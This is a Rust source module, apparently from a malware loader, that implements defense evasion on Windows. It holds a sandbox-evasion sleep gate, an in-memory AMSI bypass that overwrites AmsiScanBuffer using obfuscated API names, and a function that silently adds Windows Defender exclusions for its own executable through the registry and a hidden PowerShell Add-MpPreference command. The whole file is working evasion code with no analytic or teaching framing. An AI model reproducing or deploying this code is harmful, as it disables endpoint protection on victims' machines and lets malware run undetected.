use std::time::Duration;

/// Sandbox/AV detonation delay. Skipped with R4080_FAST=1 for lab iteration.
pub fn sleep_gate() {
    if std::env::var("R4080_FAST").is_ok() {
        return;
    }
    std::thread::sleep(Duration::from_secs(8));
}

/// Best-effort AMSI patch for the current process. Pure Rust payloads never
/// call AmsiScanBuffer, so this is inert here; it exists so the loader stage
/// stays quiet if a script host is ever chained in.
#[cfg(windows)]
pub fn patch_amsi() {
    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

    unsafe {
        let mut dll = crate::obf!("amsi.dll").into_bytes();
        dll.push(0);
        let module = LoadLibraryA(dll.as_ptr());
        if module.is_null() {
            return;
        }
        let mut name = crate::obf!("AmsiScanBuffer").into_bytes();
        name.push(0);
        let proc = GetProcAddress(module, name.as_ptr());
        let Some(proc) = proc else {
            return;
        };
        let target = proc as *mut u8;
        let patch = [0xB8u8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let mut old = 0u32;
        if VirtualProtect(
            target as *const _,
            patch.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old,
        ) == 0
        {
            return;
        }
        std::ptr::copy_nonoverlapping(patch.as_ptr(), target, patch.len());
        let mut restored = 0u32;
        VirtualProtect(
            target as *const _,
            patch.len(),
            old,
            &mut restored,
        );
    }
}

#[cfg(not(windows))]
pub fn patch_amsi() {}

/// Registry-based Defender exclusion. Tamper Protection on current Windows
/// builds blocks this without SYSTEM; treated as best effort, never fatal.
#[cfg(windows)]
pub fn add_defender_exclusion(exe: &std::path::Path) {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let path = exe.to_string_lossy().to_string();
    let dir = exe
        .parent()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_else(|| path.clone());

    crate::win::defender_exclusion_path(&path);
    crate::win::defender_exclusion_path(&dir);

    // Fallback: the cmdlet path also covers process exclusions on builds
    // where the raw registry key is locked down.
    let script = format!(
        "Add-MpPreference -ExclusionPath '{}' -ErrorAction SilentlyContinue; \
         Add-MpPreference -ExclusionProcess '{}' -ErrorAction SilentlyContinue",
        path.replace('\'', "''"),
        exe.file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_default()
            .replace('\'', "''")
    );
    let _ = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", &script])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn();
}

#[cfg(not(windows))]
pub fn add_defender_exclusion(_exe: &std::path::Path) {}
